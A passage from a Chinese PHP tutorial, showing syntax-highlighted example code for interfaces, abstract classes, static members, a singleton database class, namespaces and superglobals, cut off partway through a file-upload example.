<h3 id="9-3-接口与抽象类"><a href="#9-3-接口与抽象类" class="headerlink" title="9.3 接口与抽象类"></a>9.3 接口与抽象类</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getArea</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPerimeter</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">GeometricShape</span> <span class="keyword">implements</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$color</span>;</span><br><span class="line">    <span class="comment">// 静态成员变量</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$shapeCount</span> = <span class="number">0</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$color</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;color = <span class="variable">$color</span>;</span><br><span class="line">        <span class="comment">// 每创建一个形状，静态计数器增加</span></span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$shapeCount</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getColor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;color;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getShapeCount</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$shapeCount</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 抽象方法</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getArea</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPerimeter</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体实现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span> <span class="keyword">extends</span> <span class="title">GeometricShape</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$radius</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$color</span>, <span class="variable">$radius</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$color</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;radius = <span class="variable">$radius</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getArea</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">pi</span>() * <span class="variable language_">$this</span>-&gt;radius * <span class="variable language_">$this</span>-&gt;radius;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPerimeter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * <span class="title function_ invoke__">pi</span>() * <span class="variable language_">$this</span>-&gt;radius;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> <span class="keyword">extends</span> <span class="title">GeometricShape</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$width</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$height</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$color</span>, <span class="variable">$width</span>, <span class="variable">$height</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$color</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;width = <span class="variable">$width</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;height = <span class="variable">$height</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getArea</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;width * <span class="variable language_">$this</span>-&gt;height;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPerimeter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * (<span class="variable language_">$this</span>-&gt;width + <span class="variable language_">$this</span>-&gt;height);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用接口</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printShapeInfo</span>(<span class="params">Shape <span class="variable">$shape</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Shape info:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;- Area: &quot;</span> . <span class="variable">$shape</span>-&gt;<span class="title function_ invoke__">getArea</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;- Perimeter: &quot;</span> . <span class="variable">$shape</span>-&gt;<span class="title function_ invoke__">getPerimeter</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$shape</span> <span class="keyword">instanceof</span> GeometricShape) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;- Color: &quot;</span> . <span class="variable">$shape</span>-&gt;<span class="title function_ invoke__">getColor</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$circle</span> = <span class="keyword">new</span> <span class="title class_">Circle</span>(<span class="string">&quot;red&quot;</span>, <span class="number">5</span>);</span><br><span class="line"><span class="variable">$rectangle</span> = <span class="keyword">new</span> <span class="title class_">Rectangle</span>(<span class="string">&quot;blue&quot;</span>, <span class="number">4</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printShapeInfo</span>(<span class="variable">$circle</span>);</span><br><span class="line"><span class="title function_ invoke__">printShapeInfo</span>(<span class="variable">$rectangle</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法获取形状总数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Total shapes created: &quot;</span> . <span class="title class_">GeometricShape</span>::<span class="title function_ invoke__">getShapeCount</span>() . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="9-4-静态方法与静态属性详解"><a href="#9-4-静态方法与静态属性详解" class="headerlink" title="9.4 静态方法与静态属性详解"></a>9.4 静态方法与静态属性详解</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Database</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态属性 - 单例模式</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$connection</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 私有构造函数 - 防止直接实例化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;connection = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法 - 获取单例实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>, <span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>, <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$database</span> = <span class="string">&#x27;test&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$instance</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$instance</span> = <span class="keyword">new</span> <span class="built_in">self</span>(<span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法 - 直接执行查询</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$params</span> = []</span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$instance</span>-&gt;connection-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$params</span>) &#123;</span><br><span class="line">            <span class="variable">$types</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;s&#x27;</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$params</span>));</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="variable">$types</span>, ...<span class="variable">$params</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态实用方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 防止克隆</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 防止反序列化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用单例模式</span></span><br><span class="line"><span class="variable">$db</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line"><span class="variable">$results</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT * FROM users WHERE name = ?&quot;</span>, [<span class="string">&quot;John&quot;</span>]);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$results</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;User: &quot;</span> . <span class="title class_">Database</span>::<span class="title function_ invoke__">sanitize</span>(<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>]) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态实用类示例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MathUtils</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态常量</span></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14159265359</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instances</span> = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$instances</span>++;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$instances</span>++;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span> * <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstanceCount</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instances</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法使用静态常量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">circleArea</span>(<span class="params"><span class="variable">$radius</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable constant_">PI</span> * <span class="variable">$radius</span> * <span class="variable">$radius</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;2 + 3 = &quot;</span> . <span class="title class_">MathUtils</span>::<span class="title function_ invoke__">add</span>(<span class="number">2</span>, <span class="number">3</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;4 * 5 = &quot;</span> . <span class="title class_">MathUtils</span>::<span class="title function_ invoke__">multiply</span>(<span class="number">4</span>, <span class="number">5</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Circle area (radius=5): &quot;</span> . <span class="title class_">MathUtils</span>::<span class="title function_ invoke__">circleArea</span>(<span class="number">5</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Total method calls: &quot;</span> . <span class="title class_">MathUtils</span>::<span class="title function_ invoke__">getInstanceCount</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="9-5-命名空间"><a href="#9-5-命名空间" class="headerlink" title="9.5 命名空间"></a>9.5 命名空间</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 命名空间示例</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">MyProject</span>\<span class="title class_">Utils</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringHelper</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态成员变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instanceCount</span> = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$instanceCount</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">reverse</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$instanceCount</span>++;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法访问静态成员</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstanceCount</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instanceCount</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 另一个命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">MyProject</span>\<span class="title class_">Database</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态连接实例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$connection</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$connection</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$connection</span> = <span class="keyword">new</span> \<span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$connection</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">disconnect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$connection</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$connection</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$connection</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Main</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入命名空间</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">MyProject</span>\<span class="title">Utils</span>\<span class="title">StringHelper</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">MyProject</span>\<span class="title">Database</span>\<span class="title">Connection</span> <span class="keyword">as</span> <span class="title">DB</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">StringHelper</span>::<span class="title function_ invoke__">reverse</span>(<span class="string">&quot;Hello&quot;</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// olleH</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;StringHelper instances: &quot;</span> . <span class="title class_">StringHelper</span>::<span class="title function_ invoke__">getInstanceCount</span>() . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例会增加计数</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">StringHelper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;StringHelper instances: &quot;</span> . <span class="title class_">StringHelper</span>::<span class="title function_ invoke__">getInstanceCount</span>() . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用别名</span></span><br><span class="line"><span class="variable">$conn</span> = DB::<span class="title function_ invoke__">connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;test_db&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Database connected\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 完全限定名称</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">\MyProject\Utils\StringHelper</span>::<span class="title function_ invoke__">reverse</span>(<span class="string">&quot;World&quot;</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// dlroW</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;StringHelper instances: &quot;</span> . <span class="title class_">\MyProject\Utils\StringHelper</span>::<span class="title function_ invoke__">getInstanceCount</span>() . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line">DB::<span class="title function_ invoke__">disconnect</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Database disconnected\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="10-PHP超级全局变量"><a href="#10-PHP超级全局变量" class="headerlink" title="10. PHP超级全局变量"></a>10. PHP超级全局变量</h2><h3 id="详细解释-9"><a href="#详细解释-9" class="headerlink" title="详细解释"></a>详细解释</h3><p>超级全局变量是PHP预定义的全局数组，可以在脚本的任何作用域中访问。</p>
<h3 id="主要超级全局变量："><a href="#主要超级全局变量：" class="headerlink" title="主要超级全局变量："></a>主要超级全局变量：</h3><ul>
<li><code>$GLOBALS</code>：引用全局作用域中可用的全部变量</li>
<li><code>$_SERVER</code>：服务器和执行环境信息</li>
<li><code>$_GET</code>：HTTP GET方法传递的变量</li>
<li><code>$_POST</code>：HTTP POST方法传递的变量</li>
<li><code>$_FILES</code>：HTTP文件上传变量</li>
<li><code>$_COOKIE</code>：HTTP Cookies</li>
<li><code>$_SESSION</code>：会话变量</li>
<li><code>$_REQUEST</code>：HTTP请求变量（GET, POST, COOKIE）</li>
<li><code>$_ENV</code>：环境变量</li>
</ul>
<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $GLOBALS</span></span><br><span class="line"><span class="variable">$globalVar</span> = <span class="string">&quot;I&#x27;m global&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testGlobal</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;globalVar&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">testGlobal</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_SERVER</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Server name: &quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Request URI: &quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;User Agent: &quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_GET</span></span><br><span class="line"><span class="comment">// 假设URL为: example.com/test.php?name=Alice&amp;age=25</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Name from GET: &quot;</span> . (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;Not provided&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Age from GET: &quot;</span> . (<span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>] ?? <span class="string">&#x27;Not provided&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_POST</span></span><br><span class="line"><span class="comment">// 假设表单提交了name和email字段</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Name from POST: &quot;</span> . (<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;Not provided&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Email from POST: &quot;</span> . (<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] ?? <span class="string">&#x27;Not provided&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_COOKIE</span></span><br><span class="line"><span class="comment">// 设置Cookie</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;Alice&quot;</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Username Cookie: &quot;</span> . (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;Not set&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_SESSION</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;User in session: &quot;</span> . (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="string">&#x27;Not set&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_REQUEST</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Name from REQUEST: &quot;</span> . (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;Not provided&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_FILES</span></span><br><span class="line"><span class="comment">// 用于文件上传</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Uploaded file: &quot;</span> . <span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File type: &quot;</span> . <span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] . <span 